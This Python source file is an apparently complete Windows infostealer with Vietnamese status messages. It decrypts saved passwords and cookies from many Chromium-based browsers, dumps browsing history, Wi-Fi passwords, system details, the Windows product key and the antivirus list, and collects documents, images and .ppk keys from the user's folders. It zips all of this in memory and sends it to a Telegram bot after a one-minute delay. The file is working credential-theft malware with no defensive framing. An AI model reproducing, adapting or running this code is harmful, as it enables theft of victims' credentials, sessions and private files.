import os
import sqlite3
import json
import base64
import shutil
import requests
import subprocess
import io
import socket
from Crypto.Cipher import AES
import win32crypt
import zipfile
from screeninfo import get_monitors
import psutil
import pycountry
import time

bot_token = 'BOT-TOKEN'
chat_id = 'CHAT-ID'

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] 

        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key

    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            return None

    def decrypt_cookie(self, encrypted_value, key):
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_value = cipher.decrypt(payload)[:-16].decode()
            return decrypted_value
        except Exception as e:
            return None

    def send_telegram_message(self, file_data):
        with io.BytesIO(file_data.getvalue()) as file:
            file.name = 'data.zip' 
            requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', 
                          data={'chat_id': chat_id}, 
                          files={'document': file})

    def extract_passwords(self, zip_file):
        for browser, browser_path in self.browsers.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                login_db_path = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                shutil.copyfile(login_db_path, tmp_db_path)

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue

                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("=" * 120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)

                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")

                    password_data.write("\n")  
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())

                except Exception as e:
                    print(f"Error extracting from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def extract_cookies(self, zip_file):
        for browser, browser_path in self.browsers.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                cookies_db_path = os.path.join(browser_path, profile, 'Network', 'Cookies')
                if not os.path.exists(cookies_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_Cookies.db")
                try:
                    shutil.copyfile(cookies_db_path, tmp_db_path)
                except PermissionError:
                    print(f"Không thể sao chép tệp {cookies_db_path}. Có thể tệp đang được sử dụng.")
                    continue 

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue

                    cookie_data = io.StringIO()
                    cookie_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    cookie_data.write("=" * 120 + "\n")
                    cookie_data.write(f"{'Host':<60} | {'Cookie Name':<30} | {'Cookie Value':<30}\n")
                    cookie_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        host_key = row[0]
                        name = row[1]
                        encrypted_value = row[2]
                        decrypted_value = self.decrypt_cookie(encrypted_value, key)

                        if host_key and name and decrypted_value:
                            cookie_data.write(f"{host_key:<60} | {name:<30} | {decrypted_value:<30}\n")

                    cookie_data.write("\n") 


                    zip_file.writestr(f"browser/{browser}_cookies_{profile}.txt", cookie_data.getvalue())

                except Exception as e:
                    print(f"Error extracting cookies from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def extract_history(self, zip_file):
        for browser, browser_path in self.browsers.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                history_db_path = os.path.join(browser_path, profile, 'History')
                if not os.path.exists(history_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    print(f"Không thể sao chép tệp {history_db_path}. Có thể tệp đang được sử dụng.")
                    continue 

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("=" * 120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        last_visit_time = row[3]

                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")

                    history_data.write("\n") 
                    
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())

                except Exception as e:
                    print(f"Error extracting history from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            process = subprocess.run(
                "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName",
                shell=True, capture_output=True
            )
            if process.returncode == 0:
                output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    output = [av.strip() for av in output]
                    return ", ".join(output)
            return "No Antivirus Found"
        except Exception as e:
            return f"Error: {str(e)}"

    def get_wifi_info(self):
        wifi_data = io.StringIO()
        wifi_data.write(f"WiFi Information\n")
        wifi_data.write("=" * 40 + "\n")

        try:
            profiles = subprocess.run("netsh wlan show profiles", capture_output=True, shell=True).stdout.decode(errors='ignore')
            for line in profiles.splitlines():
                if "All User Profile" in line:
                    profile_name = line.split(":")[1].strip()
                    wifi_data.write(f"Profile: {profile_name}\n")
                    password_cmd = f'netsh wlan show profile "{profile_name}" key=clear'
                    password_info = subprocess.run(password_cmd, capture_output=True, shell=True).stdout.decode(errors='ignore')
                    for password_line in password_info.splitlines():
                        if "Key Content" in password_line:
                            password = password_line.split(":")[1].strip()
                            wifi_data.write(f"Password: {password}\n")
                    wifi_data.write("\n")

            gateway_info = subprocess.run("ipconfig", capture_output=True, shell=True).stdout.decode(errors='ignore')
            for line in gateway_info.splitlines():
                if "Default Gateway" in line:
                    gateway = line.split(":")[1].strip()
                    wifi_data.write(f"Default Gateway: {gateway}\n")
                if "IPv4 Address" in line:
                    ip_address = line.split(":")[1].strip()
                    wifi_data.write(f"IP Address: {ip_address}\n")

        except Exception as e:
            wifi_data.write(f"Error retrieving WiFi info: {str(e)}\n")

        return wifi_data.getvalue()

    def get_system_info(self):
        system_info = io.StringIO()
        system_info.write(f"System Information\n")
        system_info.write("=" * 40 + "\n")

        try:
            process = subprocess.run("systeminfo", capture_output=True, shell=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors="ignore").strip()
                system_info.write(output + "\n")
            else:
                system_info.write("Error retrieving system information.\n")
        except Exception as e:
            system_info.write(f"Error: {str(e)}\n")

        try:
            product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", 
                                          capture_output=True, shell=True)
            product_key_output = product_key.stdout.decode(errors='ignore').splitlines()
            if len(product_key_output) > 2 and product_key_output[2].strip() != "":
                system_info.write(f"Windows Product Key: {product_key_output[2].strip()}\n")
            else:
                system_info.write("Failed to get product key\n")
        except Exception as e:
            system_info.write(f"Error retrieving product key: {str(e)}\n")

        return system_info.getvalue()

    def create_zip_in_memory(self):
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_cookies(zip_file)
            self.extract_history(zip_file)

            wifi_info = self.get_wifi_info()
            zip_file.writestr("wifi_info.txt", wifi_info)

            system_info = self.get_system_info()
            zip_file.writestr("system_info.txt", system_info)

            installed_apps = self.get_installed_apps()
            zip_file.writestr("installed_apps.txt", installed_apps)

            self.extract_common_files(zip_file)

        zip_buffer.seek(0) 
        return zip_buffer

    def extract_common_files(self, zip_file):
        common_file_types = [
            ".txt", ".rtf", ".odt", ".doc", ".docx",
            ".pdf", ".csv", ".xls", ".xlsx", ".ods",
            ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"
        ]

        common_folders = [
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Pictures"),
            os.path.join(os.path.expanduser("~"), "Music"),
            os.path.join(os.path.expanduser("~"), "Videos"),
        ]

        zip_file.writestr("CommonFiles/", b'')

        for folder in common_folders:
            if not os.path.exists(folder):
                continue

            for root, _, files in os.walk(folder):
                for file in files:
                    if any(file.endswith(ext) for ext in common_file_types):
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, start=folder)  
                        zip_file.write(file_path, f"CommonFiles/{arcname}") 
    def get_installed_apps(self):
        apps_data = io.StringIO()
        apps_data.write(f"Installed Applications\n")
        apps_data.write("=" * 40 + "\n")

        try:
            process = subprocess.run("tasklist", capture_output=True, shell=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors="ignore").strip().splitlines()
                for line in output[3:]: 
                    apps_data.write(f"{line}\n")
            else:
                apps_data.write("Error retrieving installed applications.\n")
        except Exception as e:
            apps_data.write(f"Error: {str(e)}\n")

        return apps_data.getvalue()

    def check_internet_connection(self):
        try:
            socket.create_connection(("www.google.com", 80))
            return True
        except OSError:
            return False

def main():
    browser_extractor = Browsers()
    print("Chờ 1 phút trước khi bắt đầu...")
    time.sleep(60) 

    try:
        zip_buffer = browser_extractor.create_zip_in_memory()

        while not browser_extractor.check_internet_connection():
            print("Không có kết nối mạng. Đang chờ đợi...")
            time.sleep(5)  

        browser_extractor.send_telegram_message(zip_buffer)
        print("Đã gửi dữ liệu thành công!")
    except Exception as e:
        print(f"Đã xảy ra lỗi: {e}")

if __name__ == "__main__":
    main()
